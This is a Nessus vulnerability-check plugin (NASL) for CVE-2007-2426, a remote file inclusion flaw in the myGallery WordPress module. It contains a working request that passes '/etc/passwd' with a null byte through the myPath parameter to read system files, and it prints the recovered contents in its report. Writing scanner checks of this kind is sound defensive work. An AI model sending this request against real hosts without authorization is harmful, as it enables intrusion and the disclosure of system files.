#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25116);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2007-2426");
  script_bugtraq_id(23702);
  script_xref(name:"OSVDB", value:"34356");

  script_name(english:"myGallery mygallerybrowser.php myPath Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file with myGallery");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The third-party myGallery module for WordPress installed on the remote
host fails to sanitize input to the 'myPath' parameter of the
'/mygallery/myfunctions/mygallerybrowser.php' script before using it
to include PHP code.  An unauthenticated attacker can exploit this
issue to view arbitrary files on the remote host or possibly to
execute arbitrary PHP code, perhaps from third-party hosts. 

Note that exploitation of this issue does not require that PHP's
'register_globals' setting be enabled." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/3814" );
 script_set_attribute(attribute:"see_also", value:"http://www.wildbits.de/2007/04/29/sicherheitsluecke-in-mygallery/" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to myGallery version 1.4b5 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );


script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/wordpress"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to retrieve a local file.
  file = "/etc/passwd";
  req = http_get(
    item:string(
      dir, "/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?",
      "myPath=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or...
      string("main(", file, "\\0/wp-config.php): failed to open stream") >< res ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
  )
  {
    contents = NULL;
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = res;
      contents = contents - strstr(contents, "<br");
    }

    if (contents && egrep(string:contents, pattern:"root:.*:0:[01]:"))
    {
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus was\n",
        "able to read from the remote host :\n",
        "\n",
        contents
      );
    }
    else report = NULL;

    security_hole(port:port, extra:report);
    exit(0);
  }
}
